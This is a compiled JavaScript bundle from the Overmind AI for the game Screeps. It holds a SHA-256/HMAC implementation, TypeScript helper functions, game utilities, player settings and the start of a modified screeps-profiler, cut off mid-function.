//
// ___________________________________________________________
//
//  _____  _    _ _______  ______ _______ _____ __   _ ______
// |     |  \  /  |______ |_____/ |  |  |   |   | \  | |     \
// |_____|   \/   |______ |    \_ |  |  | __|__ |  \_| |_____/
//
// _______________________ Screeps AI ________________________
//
//
// Overmind repository: github.com/bencbartlett/overmind
//

'use strict';

Object.defineProperty(exports, '__esModule', { value: true });

/* tslint:disable:no-bitwise */
const digestLength = 32;
const blockSize = 64;
// Convert a string to a Uint8Array
function stringToUint8Array(str) {
    const arrayBuffer = new ArrayBuffer(str.length * 1);
    const newUint = new Uint8Array(arrayBuffer);
    newUint.forEach((_, i) => {
        newUint[i] = str.charCodeAt(i);
    });
    return newUint;
}
// SHA-256 constants
const K = new Uint32Array([
    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b,
    0x59f111f1, 0x923f82a4, 0xab1c5ed5, 0xd807aa98, 0x12835b01,
    0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7,
    0xc19bf174, 0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc,
    0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da, 0x983e5152,
    0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147,
    0x06ca6351, 0x14292967, 0x27b70a85, 0x2e1b2138, 0x4d2c6dfc,
    0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
    0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819,
    0xd6990624, 0xf40e3585, 0x106aa070, 0x19a4c116, 0x1e376c08,
    0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f,
    0x682e6ff3, 0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208,
    0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2
]);
function hashBlocks(w, v, p, pos, len) {
    let a, b, c, d, e, f, g, h, u, i, j, t1, t2;
    while (len >= 64) {
        a = v[0];
        b = v[1];
        c = v[2];
        d = v[3];
        e = v[4];
        f = v[5];
        g = v[6];
        h = v[7];
        for (i = 0; i < 16; i++) {
            j = pos + i * 4;
            w[i] = (((p[j] & 0xff) << 24) | ((p[j + 1] & 0xff) << 16) |
                ((p[j + 2] & 0xff) << 8) | (p[j + 3] & 0xff));
        }
        for (i = 16; i < 64; i++) {
            u = w[i - 2];
            t1 = (u >>> 17 | u << (32 - 17)) ^ (u >>> 19 | u << (32 - 19)) ^ (u >>> 10);
            u = w[i - 15];
            t2 = (u >>> 7 | u << (32 - 7)) ^ (u >>> 18 | u << (32 - 18)) ^ (u >>> 3);
            w[i] = (t1 + w[i - 7] | 0) + (t2 + w[i - 16] | 0);
        }
        for (i = 0; i < 64; i++) {
            t1 = (((((e >>> 6 | e << (32 - 6)) ^ (e >>> 11 | e << (32 - 11)) ^
                (e >>> 25 | e << (32 - 25))) + ((e & f) ^ (~e & g))) | 0) +
                ((h + ((K[i] + w[i]) | 0)) | 0)) | 0;
            t2 = (((a >>> 2 | a << (32 - 2)) ^ (a >>> 13 | a << (32 - 13)) ^
                (a >>> 22 | a << (32 - 22))) + ((a & b) ^ (a & c) ^ (b & c))) | 0;
            h = g;
            g = f;
            f = e;
            e = (d + t1) | 0;
            d = c;
            c = b;
            b = a;
            a = (t1 + t2) | 0;
        }
        v[0] += a;
        v[1] += b;
        v[2] += c;
        v[3] += d;
        v[4] += e;
        v[5] += f;
        v[6] += g;
        v[7] += h;
        pos += 64;
        len -= 64;
    }
    return pos;
}
// Hash implements SHA256 hash algorithm.
class Hash {
    constructor() {
        this.digestLength = digestLength;
        this.blockSize = blockSize;
        // Int32Array is used instead of Uint32Array for performance reasons.
        this.state = new Int32Array(8); // hash state
        this.temp = new Int32Array(64); // temporary state
        this.buffer = new Uint8Array(128); // buffer for data to hash
        this.bufferLength = 0; // number of bytes in buffer
        this.bytesHashed = 0; // number of total bytes hashed
        this.finished = false; // indicates whether the hash was finalized
        this.reset();
    }
    // Resets hash state making it possible
    // to re-use this instance to hash other data.
    reset() {
        this.state[0] = 0x6a09e667;
        this.state[1] = 0xbb67ae85;
        this.state[2] = 0x3c6ef372;
        this.state[3] = 0xa54ff53a;
        this.state[4] = 0x510e527f;
        this.state[5] = 0x9b05688c;
        this.state[6] = 0x1f83d9ab;
        this.state[7] = 0x5be0cd19;
        this.bufferLength = 0;
        this.bytesHashed = 0;
        this.finished = false;
        return this;
    }
    // Cleans internal buffers and re-initializes hash state.
    clean() {
        for (let i = 0; i < this.buffer.length; i++) {
            this.buffer[i] = 0;
        }
        for (let i = 0; i < this.temp.length; i++) {
            this.temp[i] = 0;
        }
        this.reset();
    }
    // Updates hash state with the given data.
    //
    // Optionally, length of the data can be specified to hash
    // fewer bytes than data.length.
    //
    // Throws error when trying to update already finalized hash:
    // instance must be reset to use it again.
    update(data, dataLength = data.length) {
        if (this.finished) {
            throw new Error('SHA256: can\'t update because hash was finished.');
        }
        let dataPos = 0;
        this.bytesHashed += dataLength;
        if (this.bufferLength > 0) {
            while (this.bufferLength < 64 && dataLength > 0) {
                this.buffer[this.bufferLength++] = data[dataPos++];
                dataLength--;
            }
            if (this.bufferLength === 64) {
                hashBlocks(this.temp, this.state, this.buffer, 0, 64);
                this.bufferLength = 0;
            }
        }
        if (dataLength >= 64) {
            dataPos = hashBlocks(this.temp, this.state, data, dataPos, dataLength);
            dataLength %= 64;
        }
        while (dataLength > 0) {
            this.buffer[this.bufferLength++] = data[dataPos++];
            dataLength--;
        }
        return this;
    }
    // Finalizes hash state and puts hash into out.
    //
    // If hash was already finalized, puts the same value.
    finish(out) {
        if (!this.finished) {
            const bytesHashed = this.bytesHashed;
            const left = this.bufferLength;
            const bitLenHi = (bytesHashed / 0x20000000) | 0;
            const bitLenLo = bytesHashed << 3;
            const padLength = (bytesHashed % 64 < 56) ? 64 : 128;
            this.buffer[left] = 0x80;
            for (let i = left + 1; i < padLength - 8; i++) {
                this.buffer[i] = 0;
            }
            this.buffer[padLength - 8] = (bitLenHi >>> 24) & 0xff;
            this.buffer[padLength - 7] = (bitLenHi >>> 16) & 0xff;
            this.buffer[padLength - 6] = (bitLenHi >>> 8) & 0xff;
            this.buffer[padLength - 5] = (bitLenHi >>> 0) & 0xff;
            this.buffer[padLength - 4] = (bitLenLo >>> 24) & 0xff;
            this.buffer[padLength - 3] = (bitLenLo >>> 16) & 0xff;
            this.buffer[padLength - 2] = (bitLenLo >>> 8) & 0xff;
            this.buffer[padLength - 1] = (bitLenLo >>> 0) & 0xff;
            hashBlocks(this.temp, this.state, this.buffer, 0, padLength);
            this.finished = true;
        }
        for (let i = 0; i < 8; i++) {
            out[i * 4 + 0] = (this.state[i] >>> 24) & 0xff;
            out[i * 4 + 1] = (this.state[i] >>> 16) & 0xff;
            out[i * 4 + 2] = (this.state[i] >>> 8) & 0xff;
            out[i * 4 + 3] = (this.state[i] >>> 0) & 0xff;
        }
        return this;
    }
    // Returns the final hash digest.
    digest() {
        const out = new Uint8Array(this.digestLength);
        this.finish(out);
        return out;
    }
    // Internal function for use in HMAC for optimization.
    _saveState(out) {
        for (let i = 0; i < this.state.length; i++) {
            out[i] = this.state[i];
        }
    }
    // Internal function for use in HMAC for optimization.
    _restoreState(from, bytesHashed) {
        for (let i = 0; i < this.state.length; i++) {
            this.state[i] = from[i];
        }
        this.bytesHashed = bytesHashed;
        this.finished = false;
        this.bufferLength = 0;
    }
}
// HMAC implements HMAC-SHA256 message authentication algorithm.
class HMAC {
    constructor(key) {
        this.inner = new Hash();
        this.outer = new Hash();
        this.blockSize = this.inner.blockSize;
        this.digestLength = this.inner.digestLength;
        const pad = new Uint8Array(this.blockSize);
        if (key.length > this.blockSize) {
            (new Hash()).update(key).finish(pad).clean();
        }
        else {
            for (let i = 0; i < key.length; i++) {
                pad[i] = key[i];
            }
        }
        for (let i = 0; i < pad.length; i++) {
            pad[i] ^= 0x36;
        }
        this.inner.update(pad);
        for (let i = 0; i < pad.length; i++) {
            pad[i] ^= 0x36 ^ 0x5c;
        }
        this.outer.update(pad);
        this.istate = new Uint32Array(8);
        this.ostate = new Uint32Array(8);
        this.inner._saveState(this.istate);
        this.outer._saveState(this.ostate);
        for (let i = 0; i < pad.length; i++) {
            pad[i] = 0;
        }
    }
    // Returns HMAC state to the state initialized with key
    // to make it possible to run HMAC over the other data with the same
    // key without creating a new instance.
    reset() {
        this.inner._restoreState(this.istate, this.inner.blockSize);
        this.outer._restoreState(this.ostate, this.outer.blockSize);
        return this;
    }
    // Cleans HMAC state.
    clean() {
        for (let i = 0; i < this.istate.length; i++) {
            this.ostate[i] = this.istate[i] = 0;
        }
        this.inner.clean();
        this.outer.clean();
    }
    // Updates state with provided data.
    update(data) {
        this.inner.update(data);
        return this;
    }
    // Finalizes HMAC and puts the result in out.
    finish(out) {
        if (this.outer.finished) {
            this.outer.finish(out);
        }
        else {
            this.inner.finish(out);
            this.outer.update(out, this.digestLength).finish(out);
        }
        return this;
    }
    // Returns message authentication code.
    digest() {
        const out = new Uint8Array(this.digestLength);
        this.finish(out);
        return out;
    }
}
// Returns SHA256 hash of data.
function sha256(data) {
    const h = (new Hash()).update(stringToUint8Array(data));
    const digest = h.digest();
    h.clean();
    return digest;
}
// Returns HMAC-SHA256 of data under the key.
function hmac(key, data) {
    const h = (new HMAC(key)).update(data);
    const digest = h.digest();
    h.clean();
    return digest;
}

/*! *****************************************************************************
Copyright (c) Microsoft Corporation. All rights reserved.
Licensed under the Apache License, Version 2.0 (the "License"); you may not use
this file except in compliance with the License. You may obtain a copy of the
License at http://www.apache.org/licenses/LICENSE-2.0

THIS CODE IS PROVIDED ON AN *AS IS* BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
KIND, EITHER EXPRESS OR IMPLIED, INCLUDING WITHOUT LIMITATION ANY IMPLIED
WARRANTIES OR CONDITIONS OF TITLE, FITNESS FOR A PARTICULAR PURPOSE,
MERCHANTABLITY OR NON-INFRINGEMENT.

See the Apache Version 2.0 License for specific language governing permissions
and limitations under the License.
***************************************************************************** */
/* global Reflect, Promise */

var extendStatics = function(d, b) {
    extendStatics = Object.setPrototypeOf ||
        ({ __proto__: [] } instanceof Array && function (d, b) { d.__proto__ = b; }) ||
        function (d, b) { for (var p in b) if (b.hasOwnProperty(p)) d[p] = b[p]; };
    return extendStatics(d, b);
};

function __extends(d, b) {
    extendStatics(d, b);
    function __() { this.constructor = d; }
    d.prototype = b === null ? Object.create(b) : (__.prototype = b.prototype, new __());
}

var __assign = function() {
    __assign = Object.assign || function __assign(t) {
        for (var s, i = 1, n = arguments.length; i < n; i++) {
            s = arguments[i];
            for (var p in s) if (Object.prototype.hasOwnProperty.call(s, p)) t[p] = s[p];
        }
        return t;
    };
    return __assign.apply(this, arguments);
};

function __rest(s, e) {
    var t = {};
    for (var p in s) if (Object.prototype.hasOwnProperty.call(s, p) && e.indexOf(p) < 0)
        t[p] = s[p];
    if (s != null && typeof Object.getOwnPropertySymbols === "function")
        for (var i = 0, p = Object.getOwnPropertySymbols(s); i < p.length; i++) if (e.indexOf(p[i]) < 0)
            t[p[i]] = s[p[i]];
    return t;
}

function __decorate(decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
}

function __param(paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
}

function __metadata(metadataKey, metadataValue) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(metadataKey, metadataValue);
}

function __awaiter(thisArg, _arguments, P, generator) {
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : new P(function (resolve) { resolve(result.value); }).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
}

function __generator(thisArg, body) {
    var _ = { label: 0, sent: function() { if (t[0] & 1) throw t[1]; return t[1]; }, trys: [], ops: [] }, f, y, t, g;
    return g = { next: verb(0), "throw": verb(1), "return": verb(2) }, typeof Symbol === "function" && (g[Symbol.iterator] = function() { return this; }), g;
    function verb(n) { return function (v) { return step([n, v]); }; }
    function step(op) {
        if (f) throw new TypeError("Generator is already executing.");
        while (_) try {
            if (f = 1, y && (t = op[0] & 2 ? y["return"] : op[0] ? y["throw"] || ((t = y["return"]) && t.call(y), 0) : y.next) && !(t = t.call(y, op[1])).done) return t;
            if (y = 0, t) op = [op[0] & 2, t.value];
            switch (op[0]) {
                case 0: case 1: t = op; break;
                case 4: _.label++; return { value: op[1], done: false };
                case 5: _.label++; y = op[1]; op = [0]; continue;
                case 7: op = _.ops.pop(); _.trys.pop(); continue;
                default:
                    if (!(t = _.trys, t = t.length > 0 && t[t.length - 1]) && (op[0] === 6 || op[0] === 2)) { _ = 0; continue; }
                    if (op[0] === 3 && (!t || (op[1] > t[0] && op[1] < t[3]))) { _.label = op[1]; break; }
                    if (op[0] === 6 && _.label < t[1]) { _.label = t[1]; t = op; break; }
                    if (t && _.label < t[2]) { _.label = t[2]; _.ops.push(op); break; }
                    if (t[2]) _.ops.pop();
                    _.trys.pop(); continue;
            }
            op = body.call(thisArg, _);
        } catch (e) { op = [6, e]; y = 0; } finally { f = t = 0; }
        if (op[0] & 5) throw op[1]; return { value: op[0] ? op[1] : void 0, done: true };
    }
}

function __exportStar(m, exports) {
    for (var p in m) if (!exports.hasOwnProperty(p)) exports[p] = m[p];
}

function __values(o) {
    var m = typeof Symbol === "function" && o[Symbol.iterator], i = 0;
    if (m) return m.call(o);
    return {
        next: function () {
            if (o && i >= o.length) o = void 0;
            return { value: o && o[i++], done: !o };
        }
    };
}

function __read(o, n) {
    var m = typeof Symbol === "function" && o[Symbol.iterator];
    if (!m) return o;
    var i = m.call(o), r, ar = [], e;
    try {
        while ((n === void 0 || n-- > 0) && !(r = i.next()).done) ar.push(r.value);
    }
    catch (error) { e = { error: error }; }
    finally {
        try {
            if (r && !r.done && (m = i["return"])) m.call(i);
        }
        finally { if (e) throw e.error; }
    }
    return ar;
}

function __spread() {
    for (var ar = [], i = 0; i < arguments.length; i++)
        ar = ar.concat(__read(arguments[i]));
    return ar;
}

function __await(v) {
    return this instanceof __await ? (this.v = v, this) : new __await(v);
}

function __asyncGenerator(thisArg, _arguments, generator) {
    if (!Symbol.asyncIterator) throw new TypeError("Symbol.asyncIterator is not defined.");
    var g = generator.apply(thisArg, _arguments || []), i, q = [];
    return i = {}, verb("next"), verb("throw"), verb("return"), i[Symbol.asyncIterator] = function () { return this; }, i;
    function verb(n) { if (g[n]) i[n] = function (v) { return new Promise(function (a, b) { q.push([n, v, a, b]) > 1 || resume(n, v); }); }; }
    function resume(n, v) { try { step(g[n](v)); } catch (e) { settle(q[0][3], e); } }
    function step(r) { r.value instanceof __await ? Promise.resolve(r.value.v).then(fulfill, reject) : settle(q[0][2], r); }
    function fulfill(value) { resume("next", value); }
    function reject(value) { resume("throw", value); }
    function settle(f, v) { if (f(v), q.shift(), q.length) resume(q[0][0], q[0][1]); }
}

function __asyncDelegator(o) {
    var i, p;
    return i = {}, verb("next"), verb("throw", function (e) { throw e; }), verb("return"), i[Symbol.iterator] = function () { return this; }, i;
    function verb(n, f) { i[n] = o[n] ? function (v) { return (p = !p) ? { value: __await(o[n](v)), done: n === "return" } : f ? f(v) : v; } : f; }
}

function __asyncValues(o) {
    if (!Symbol.asyncIterator) throw new TypeError("Symbol.asyncIterator is not defined.");
    var m = o[Symbol.asyncIterator], i;
    return m ? m.call(o) : (o = typeof __values === "function" ? __values(o) : o[Symbol.iterator](), i = {}, verb("next"), verb("throw"), verb("return"), i[Symbol.asyncIterator] = function () { return this; }, i);
    function verb(n) { i[n] = o[n] && function (v) { return new Promise(function (resolve, reject) { v = o[n](v), settle(resolve, reject, v.done, v.value); }); }; }
    function settle(resolve, reject, d, v) { Promise.resolve(v).then(function(v) { resolve({ value: v, done: d }); }, reject); }
}

function __makeTemplateObject(cooked, raw) {
    if (Object.defineProperty) { Object.defineProperty(cooked, "raw", { value: raw }); } else { cooked.raw = raw; }
    return cooked;
}

function __importStar(mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null) for (var k in mod) if (Object.hasOwnProperty.call(mod, k)) result[k] = mod[k];
    result.default = mod;
    return result;
}

function __importDefault(mod) {
    return (mod && mod.__esModule) ? mod : { default: mod };
}

// A bunch of unicode string constants
const bullet = '\u2023 ';
const rightArrow = '\u27f6';
const leftArrow = '\u27f5';
const leftAngleQuote = '\u00ab';
const rightAngleQuote = '\u00bb';
const alignedNewline = '\n' + ' '.repeat('INFO    '.length + Game.time.toString().length + ' '.length);

// Random utilities that don't belong anywhere else
function getAllColonyRooms() {
    return _.filter(_.values(Game.rooms), room => room.my);
}
function printRoomName(roomName) {
    return '<a href="#!/room/' + Game.shard.name + '/' + roomName + '">' + roomName + '</a>';
}
function color(str, color) {
    return `<font color='${color}'>${str}</font>`;
}
/**
 * Correct generalization of the modulo operator to negative numbers
 */
function mod(n, m) {
    return ((n % m) + m) % m;
}
function minMax(value, min, max) {
    return Math.max(Math.min(value, max), min);
}
function hasMinerals(store) {
    for (const resourceType in store) {
        if (resourceType != RESOURCE_ENERGY && (store[resourceType] || 0) > 0) {
            return true;
        }
    }
    return false;
}
/**
 * Obtain the username of the player
 */
function getUsername() {
    for (const i in Game.rooms) {
        const room = Game.rooms[i];
        if (room.controller && room.controller.my) {
            return room.controller.owner.username;
        }
    }
    for (const i in Game.creeps) {
        const creep = Game.creeps[i];
        if (creep.owner) {
            return creep.owner.username;
        }
    }
    console.log('ERROR: Could not determine username. You can set this manually in src/settings/settings_user');
    return 'ERROR: Could not determine username.';
}
function hasJustSpawned() {
    return _.keys(Overmind.colonies).length == 1 && _.keys(Game.creeps).length == 0 && _.keys(Game.spawns).length == 1;
}
function onPublicServer() {
    return Game.shard.name.includes('shard');
}
function onTrainingEnvironment() {
    return !!Memory.reinforcementLearning && !!Memory.reinforcementLearning.enabled;
}
function getReinforcementLearningTrainingVerbosity() {
    if (Memory.reinforcementLearning) {
        if (Memory.reinforcementLearning.verbosity != undefined) {
            return Memory.reinforcementLearning.verbosity;
        }
    }
    return 0;
}
function bulleted(text, aligned = true, startWithNewLine = true) {
    if (text.length == 0) {
        return '';
    }
    const prefix = (startWithNewLine ? (aligned ? alignedNewline : '\n') : '') + bullet;
    if (aligned) {
        return prefix + text.join(alignedNewline + bullet);
    }
    else {
        return prefix + text.join('\n' + bullet);
    }
}
/**
 * Create column-aligned text array from object with string key/values
 */
function toColumns(obj, opts = {}) {
    _.defaults(opts, {
        padChar: ' ',
        justify: false // Right align values column?
    });
    const ret = [];
    const keyPadding = _.max(_.map(_.keys(obj), str => str.length)) + 1;
    const valPadding = _.max(_.mapValues(obj, str => str.length));
    for (const key in obj) {
        if (opts.justify) {
            ret.push(key.padRight(keyPadding, opts.padChar) + obj[key].padLeft(valPadding, opts.padChar));
        }
        else {
            ret.push(key.padRight(keyPadding, opts.padChar) + obj[key]);
        }
    }
    return ret;
}
/**
 * Merges a list of store-like objects, summing overlapping keys. Useful for calculating assets from multiple sources
 */
function mergeSum(objects) {
    const ret = {};
    for (const object of objects) {
        for (const key in object) {
            const amount = object[key] || 0;
            if (!ret[key]) {
                ret[key] = 0;
            }
            ret[key] += amount;
        }
    }
    return ret;
}
function coordName(coord) {
    return coord.x + ':' + coord.y;
}
const CHARCODE_A = 65;
/**
 * Returns a compact two-character encoding of the coordinate
 */
function compactCoordName(coord) {
    return String.fromCharCode(CHARCODE_A + coord.x, CHARCODE_A + coord.y);
}
function derefCoords(coordName, roomName) {
    const [x, y] = coordName.split(':');
    return new RoomPosition(parseInt(x, 10), parseInt(y, 10), roomName);
}
function getPosFromString(str) {
    if (!str)
        return;
    const posName = _.first(str.match(/(E|W)\d+(N|S)\d+:\d+:\d+/g) || []);
    if (posName) {
        const [roomName, x, y] = posName.split(':');
        return new RoomPosition(parseInt(x, 10), parseInt(y, 10), roomName);
    }
}
function equalXYR(pos1, pos2) {
    return pos1.x == pos2.x && pos1.y == pos2.y && pos1.roomName == pos2.roomName;
}
/**
 * Averages a list of objects by mapping object=>iteratee(object)
 */
function averageBy(objects, iteratee) {
    if (objects.length == 0) {
        return undefined;
    }
    else {
        return _.sum(objects, obj => iteratee(obj)) / objects.length;
    }
}
/**
 * Equivalent to lodash.minBy() method
 */
function minBy(objects, iteratee) {
    let minObj;
    let minVal = Infinity;
    let val;
    for (const i in objects) {
        val = iteratee(objects[i]);
        if (val !== false && val < minVal) {
            minVal = val;
            minObj = objects[i];
        }
    }
    return minObj;
}
/**
 * Equivalent to lodash.maxBy() method
 */
function maxBy(objects, iteratee) {
    let maxObj;
    let maxVal = -Infinity;
    let val;
    for (const i in objects) {
        val = iteratee(objects[i]);
        if (val !== false && val > maxVal) {
            maxVal = val;
            maxObj = objects[i];
        }
    }
    return maxObj;
}
function logHeapStats() {
    if (typeof Game.cpu.getHeapStatistics === 'function') {
        const heapStats = Game.cpu.getHeapStatistics();
        const heapPercent = Math.round(100 * (heapStats.total_heap_size + heapStats.externally_allocated_size)
            / heapStats.heap_size_limit);
        const heapSize = Math.round((heapStats.total_heap_size) / 1048576);
        const externalHeapSize = Math.round((heapStats.externally_allocated_size) / 1048576);
        const heapLimit = Math.round(heapStats.heap_size_limit / 1048576);
        console.log(`Heap usage: ${heapSize} MB + ${externalHeapSize} MB of ${heapLimit} MB (${heapPercent}%).`);
    }
}
/**
 * Return whether the IVM is enabled
 */
function isIVM() {
    return typeof Game.cpu.getHeapStatistics === 'function';
}
/**
 * Generate a randomly-offset cache expiration time
 */
function getCacheExpiration(timeout, offset = 5) {
    return Game.time + timeout + Math.round((Math.random() * offset * 2) - offset);
}
const hexChars = '0123456789abcdef';
/**
 * Generate a random hex string of specified length
 */
function randomHex(length) {
    let result = '';
    for (let i = 0; i < length; i++) {
        result += hexChars[Math.floor(Math.random() * hexChars.length)];
    }
    return result;
}
/**
 * Compute an exponential moving average
 */
function exponentialMovingAverage(current, avg, window) {
    return (current + (avg || 0) * (window - 1)) / window;
}
/**
 * Compute an exponential moving average for unevenly spaced samples
 */
function irregularExponentialMovingAverage(current, avg, dt, window) {
    return (current * dt + avg * (window - dt)) / window;
}
/**
 * Create a shallow copy of a 2D array
 */
function clone2DArray(a) {
    return _.map(a, e => e.slice());
}
/**
 * Rotate a square matrix in place clockwise by 90 degrees
 */
function rotateMatrix(matrix) {
    // reverse the rows
    matrix.reverse();
    // swap the symmetric elements
    for (let i = 0; i < matrix.length; i++) {
        for (let j = 0; j < i; j++) {
            const temp = matrix[i][j];
            matrix[i][j] = matrix[j][i];
            matrix[j][i] = temp;
        }
    }
}
/**
 * Return a copy of a 2D array rotated by specified number of clockwise 90 turns
 */
function rotatedMatrix(matrix, clockwiseTurns) {
    const mat = clone2DArray(matrix);
    for (let i = 0; i < clockwiseTurns; i++) {
        rotateMatrix(mat);
    }
    return mat;
}

// Global settings file containing player information
/**
 * My Screeps username; used for a variety of updating and communications purposes. (Changing this might break things.)
 */
const MUON = 'Muon';
/**
 * Your username - you shouldn't need to change this.
 */
const MY_USERNAME = getUsername();
/**
 * Enable this to build from source including screeps-profiler. (This is separate from Overmind-Profiler.)
 */
const USE_PROFILER = false;
/**
 * Profiling is incredibly expensive and can cause the script to time out. By setting this option, you can limit the
 * number of colonies that will be handled while profiling. Colonies above this limit do not get run.
 */
const PROFILER_COLONY_LIMIT = Math.ceil(Game.gcl.level / 2);
/**
 * While profiling, ensure these colonies are included in the randomly chosen ones specified by PROFILER_COLONY_LIMIT.
 */
const PROFILER_INCLUDE_COLONIES = [ /*'E15S49'*/];
/**
 * Enable this to wrap evaluations of constructor, init, and run phase for each colony in try...catch statemenets.
 */
const USE_TRY_CATCH = true;
/**
 * Default controller signature; don't change this.
 * You can set your controller signature with the console command "setSignature()"
 * Operation will be penalized by skipping every 3rd tick for using a signature that does not contain the substring
 * "overmind" or the small-caps variant.
 */
const OVERMIND_PLAIN = 'Overmind';
const OVERMIND_SMALL_CAPS = '\u1D0F\u1D20\u1D07\u0280\u1D0D\u026A\u0274\u1D05';
const DEFAULT_OVERMIND_SIGNATURE = leftAngleQuote + OVERMIND_SMALL_CAPS + rightAngleQuote;
global.__DEFAULT_OVERMIND_SIGNATURE__ = DEFAULT_OVERMIND_SIGNATURE;
/**
 * If this is enabled, Memory.bot will default to true. This will not change the mode if already set - use setMode().
 */
const DEFAULT_OPERATION_MODE = 'automatic';
/**
 * Limit how many rooms you can claim (for any shard)
 */
const MAX_OWNED_ROOMS = Infinity;
/**
 * If you are running on shard3 (CPU limit 20), only claim this many rooms
 */
const SHARD3_MAX_OWNED_ROOMS = 3;
/**
 * The global Overmind object will be re-instantiated after this many ticks. In the meantime, refresh() is used.
 */
const NEW_OVERMIND_INTERVAL = onPublicServer() ? 20 : 5;
/**
 * Master scale for the RoomVisuals GUI // todo: not plugged in yet
 */
const GUI_SCALE = 1.0;
/**
 * If this is set to true, a stripped-down version of Overmind suitable for training with my python screeps environment
 * will be run instead. The main loop will be disabled and creeps will be controlled based on serialized actions
 * communicated to them from the RL model through memory.
 * WARNING: enabling RL_TRAINING_MODE will wipe the contents of your memory!
 */
const RL_TRAINING_MODE = onTrainingEnvironment();
/**
 * Configure how much stuff gets logged to console
 * 0: no logging
 * 1: log every 100th, 101th tick
 * 2: log every tick
 */
const RL_TRAINING_VERBOSITY = getReinforcementLearningTrainingVerbosity();

var commonjsGlobal = typeof window !== 'undefined' ? window : typeof global !== 'undefined' ? global : typeof self !== 'undefined' ? self : {};

function commonjsRequire () {
    throw new Error('Dynamic requires are not currently supported by rollup-plugin-commonjs');
}

function unwrapExports (x) {
    return x && x.__esModule && Object.prototype.hasOwnProperty.call(x, 'default') ? x['default'] : x;
}

function createCommonjsModule(fn, module) {
    return module = { exports: {} }, fn(module, module.exports), module.exports;
}

'use strict';

// This is a modified version of screeps-profiler taken from https://github.com/samogot/screeps-profiler


let usedOnStart = 0;
let enabled = false;
let depth = 0;
let parentFn = '(tick)';

function AlreadyWrappedError() {
    this.name = 'AlreadyWrappedError';
    this.message = 'Error attempted to double wrap a function.';
    this.stack = ((new Error())).stack;
}

function setupProfiler() {
    depth = 0; // reset depth, this needs to be done each tick.
    parentFn = '(tick)';
    Game.profiler = {
        stream(duration, filter) {
            setupMemory('stream', duration || 10, filter);
        },
        email(duration, filter) {
            setupMemory('email', duration || 100, filter);
        },
        profile(duration, filter) {
            setupMemory('profile', duration || 100, filter);
        },
        background(filter) {
            setupMemory('background', false, filter);
        },
        callgrind() {
            const id = `id${Math.random()}`;
            /* eslint-disable */
            const download = `
<script>
  var element = document.getElementById('${id}');
  if (!element) {
    element = document.createElement('a');
    element.setAttribute('id', '${id}');
    element.setAttribute('href', 'data:text/plain;charset=utf-8,${encodeURIComponent(Profiler.callgrind())}');
    element.setAttribute('download', 'callgrind.out.${Game.time}');
  
    element.style.display = 'none';
    document.body.appendChild(element);
  
    element.click();
  }
</script>
      `;
            /* eslint-enable */
            console.log(download.split('\n').map((s) => s.trim()).join(''));
        },
        restart() {
            if (Profiler.isProfiling()) {
                const filter = Memory.profiler.filter;
                let duration = false;
                if (!!Memory.profiler.disableTick) {
                    // Calculate the original duration, profile is enabled on the tick after the first call,
                    // so add 1.
                    duration = Memory.profiler.disableTick - Memory.profiler.enabledTick + 1;
                }
                const type = Memory.profiler.type;
                setupMemory(type, duration, filter);
            }
        },
        reset: resetMemory,
        output: Profiler.output,
    };

    overloadCPUCalc();
}

function setupMemory(profileType, duration, filter) {
    resetMemory();
    const disableTick = Number.isInteger(duration) ? Game.time + duration : false;
    if (!Memory.profiler) {
        Memory.profiler = {
            map: {},
            totalTime: 0,
            enabledTick: Game.time + 1,
            disableTick,
            type: profileType,
            filter,
        };
    }
}

function resetMemory() {
    Memory.profiler = null;
}

function overloadCPUCalc() {
    if (Game.rooms.sim) {
        usedOnStart = 0; // This needs to be reset, but only in the sim.
        Game.cpu.getUsed = function getUsed() {
            return performance.now() - usedOnStart;
        };
    }
}

function getFilter() {
    return Memory.profiler.filter;
}

const functionBlackList = [
    'getUsed', // Let's avoid wrapping this... may lead to recursion issues and should be inexpensive.
    'constructor', // es6 class constructors need to be called with `new`
];

const commonProperties = ['length', 'name', 'arguments', 'caller', 'prototype'];

function wrapFunction(name, originalFunction) {
    if (originalFunction.profilerWrapped) {
        throw new AlreadyWrappedError();
    }

    function wrappedFunction() {
        if (Profiler.isProfiling()) {
            const nameMatchesFilter = name === getFilter();
            const start = Game.cpu.getUsed();
            if (nameMatchesFilter) {
                depth++;
            }
            const curParent = parentFn;
            parentFn = name;
            let result;
            if (this && this.constructor === wrappedFunction) {
                // eslint-disable-next-line new-cap
                result = new originalFunction(...arguments);
            } else {
                result = originalFunction.apply(this, arguments);
            }
            parentFn = curParent;
            if (depth > 0 || !getFilter()) {
                const end = Game.cpu.getUsed();
                Profiler.record(name, end - start, parentFn);
            }
            if (nameMatchesFilter) {
                depth--;
            }
            return result;
        }

        if (this && this.constructor === wrappedFunction) {
            // eslint-disable-next-line new-cap
            return new originalFunction(...arguments);
        }
